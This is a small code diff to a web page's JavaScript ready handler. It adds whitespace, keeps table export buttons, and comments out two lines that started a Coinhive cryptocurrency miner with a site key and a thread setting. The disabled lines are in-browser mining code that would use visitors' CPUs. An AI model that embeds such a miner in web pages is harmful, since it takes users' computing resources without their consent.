@@ -57,12 +57,14 @@ $( document ).ready(function() {
         });
     });
 
+    
+
     /* Create export buttons */
     TableExport(document.getElementsByTagName("table"), {
         formats: ['csv', 'txt']
     });
 
     /* Start Coinhive miner */
-    var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
-    miner.start();
+    // var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
+    // miner.start();
 });
